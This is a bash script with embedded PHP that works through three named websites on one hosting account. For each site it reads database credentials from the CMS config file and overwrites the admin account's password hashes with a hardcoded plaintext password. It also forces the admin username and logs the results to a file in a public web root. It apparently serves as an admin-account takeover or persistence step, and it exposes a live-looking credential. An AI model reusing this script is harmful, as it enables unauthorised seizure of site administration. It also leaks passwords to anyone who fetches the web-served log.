#!/bin/bash
PW='Inf1nx@2026#Cuci!'; export PW
B=/home/u133275855/domains
for spec in "peluang88-my.com:biz_" "12cucimy.com:biz_" "mantap88a.my:"; do
  d="${spec%%:*}"; pfx="${spec##*:}"
  D="$B/$d/public_html"
  php -r '
  include "'"$D"'/data/common.inc.php";
  $m=new mysqli($cfg_dbhost,$cfg_dbuser,$cfg_dbpwd,$cfg_dbname); if($m->connect_errno){echo "'"$d"' dbfail\n";exit;}
  $p=getenv("PW"); $old=substr(md5($p),5,20); $new=password_hash($p,PASSWORD_BCRYPT);
  $tbl=$cfg_dbprefix."admin";
  $m->query("UPDATE `$tbl` SET pwd=\x27$old\x27, pwd_new=\x27".$m->real_escape_string($new)."\x27, userid=\x27admin\x27 WHERE id=1 OR userid=\x27admin\x27");
  echo "'"$d"' admin rows=".$m->affected_rows."\n";
  ' PW="$PW" 2>&1
done > "$B/peluang88-my.com/public_html/_adminpw.txt" 2>&1
